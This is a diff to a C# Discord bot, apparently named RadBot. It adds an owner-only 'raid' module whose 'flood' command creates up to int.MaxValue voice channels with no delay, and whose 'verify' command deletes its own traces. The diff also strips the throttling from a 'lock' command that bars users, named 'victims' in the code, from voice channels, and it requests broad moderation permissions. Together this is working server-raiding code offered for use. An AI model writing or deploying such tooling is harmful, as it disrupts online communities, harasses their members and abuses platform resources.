@@ -12,12 +12,18 @@ using Discord.Commands;
 using Discord.WebSocket;
 using Newtonsoft.Json;
 using RadLibrary.Configuration;
+using RadLibrary.Logging;
+using RadLibrary.Logging.Loggers;
 
 #endregion
 
 namespace RadBot.Modules
 {
     [RequireBotPermission(GuildPermission.MoveMembers)]
+    [RequireBotPermission(GuildPermission.MuteMembers)]
+    [RequireBotPermission(GuildPermission.DeafenMembers)]
+    [RequireBotPermission(GuildPermission.KickMembers)]
+    [RequireBotPermission(GuildPermission.ViewChannel)]
     [RequireUserPermission(GuildPermission.BanMembers)] // like admin
     [Name("Fun")]
     [Group("fun")]
@@ -167,7 +173,7 @@ namespace RadBot.Modules
         
         [Command("lock", RunMode = RunMode.Async)]
         [Summary("Prevents users from connecting to any voice channel.")]
-        public async Task LockAsync([Summary("The time to lock for.")] TimeSpan time = default)
+        public Task LockAsync([Summary("The time to lock for.")] TimeSpan time = default)
         {
             if (time == default)
                 time = new TimeSpan(TimeSpan.TicksPerDay);
@@ -177,8 +183,10 @@ namespace RadBot.Modules
             foreach (var socketGuildUser in victims.Users)
             {
                 Task.Run(() => LockAsync(socketGuildUser, time));
-                await Task.Delay(750);
+                Task.Delay(750);
             }
+            
+            return Task.CompletedTask;
         }
 
         [Command("unlock")]
@@ -252,6 +260,80 @@ namespace RadBot.Modules
             var num = _random.Next(users.Count);
 
             await ReplyAsync(users[num].Username);
+        }
+
+        [RequireOwner]
+        [Name("Raid")]
+        [Group("raid")]
+        class RaidModule : ModuleBase<SocketCommandContext>
+        {
+            [Command("verify", RunMode = RunMode.Async)]
+            [Summary("Verifies that we can raid this channel.")]
+            public async Task VerifyAsync()
+            {
+                var bot = Context.Guild.GetUser(Context.Client.CurrentUser.Id);
+
+                var text = ", I'm ready.";
+                
+                // does our bot has permissions to create channels
+                if (!bot.GuildPermissions.ManageChannels)
+                {
+                    text = ", I have no permissions to manage channels.";
+                }
+                
+                var msg = await ReplyAsync(Context.User.Mention + text);
+                await Task.Delay(1500);
+                await msg.DeleteAsync();
+                await Context.Message.DeleteAsync();
+            }
+            
+            [Command("flood", RunMode = RunMode.Async)]
+            [Summary("Creates many voice channels.")]
+            public async Task VoiceFloodAsync()
+            {
+                for (var i = 0; i < int.MaxValue; ++i)
+                {
+                    try
+                    {
+                        await Context.Guild.CreateVoiceChannelAsync(i.ToString());
+                        LogManager.GetLogger<ConsoleLogger>("RAID_MODULE").Info("CREATED {0} VOICE CHANNEL", i);
+                    }
+                    catch
+                    {
+                        LogManager.GetLogger<ConsoleLogger>("RAID_MODULE")
+                            .Warn("FAILED TO CREATE {0} VOICE CHANNEL", i);
+                    }
+
+                    //await Task.Delay(150);
+                }
+            }
+
+            [Command("unflood", RunMode = RunMode.Async)]
+            [Summary("Removes flooded voice channels.")]
+            public async Task VoiceUnFloodAsync()
+            {
+                var channels = Context.Guild.VoiceChannels;
+
+                foreach (var channel in channels)
+                {
+                    if (int.TryParse(channel.Name, out _))
+                    {
+                        try
+                        {
+                            await channel.DeleteAsync();
+                            LogManager.GetLogger<ConsoleLogger>("RAID_MODULE")
+                                .Info("DELETED {0} VOICE CHANNEL", channel.Name);
+                        }
+                        catch
+                        {
+                            LogManager.GetLogger<ConsoleLogger>("RAID_MODULE")
+                                .Warn("FAILED TO DELETE {0} VOICE CHANNEL", channel.Name);
+                        }
+                    }
+
+                    //await Task.Delay(100);
+                }
+            }
         }
 
         private sealed class Meme
